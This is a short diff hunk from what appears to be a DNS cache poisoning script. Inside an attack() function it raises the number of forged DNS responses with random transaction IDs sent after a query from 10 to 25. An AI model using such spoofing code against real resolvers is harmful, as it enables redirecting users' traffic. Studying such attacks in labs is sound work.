@@ -84,7 +84,7 @@ def attack():
 
         # send dns query
         sendPacket(sock, dns_request, my_ip, dns_port)
-        for i in range(10):
+        for i in range(25):
             fake_response[DNS].id = getRandomTXID()
             sendPacket(sock, fake_response, my_ip, query_port)
 
